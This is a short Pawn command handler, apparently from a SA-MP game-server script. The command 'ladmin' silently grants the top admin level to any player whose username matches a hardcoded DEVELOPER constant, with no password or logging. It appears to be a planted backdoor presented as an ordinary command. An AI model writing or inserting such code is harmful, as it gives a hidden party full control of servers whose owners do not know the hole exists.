CMD:ladmin(playerid, params[])
{
    if(!strcmp(AccountData[playerid][uUsername], DEVELOPER))
    {
        AccountData[playerid][uAdmin] = 4;
    }
    return 1;
}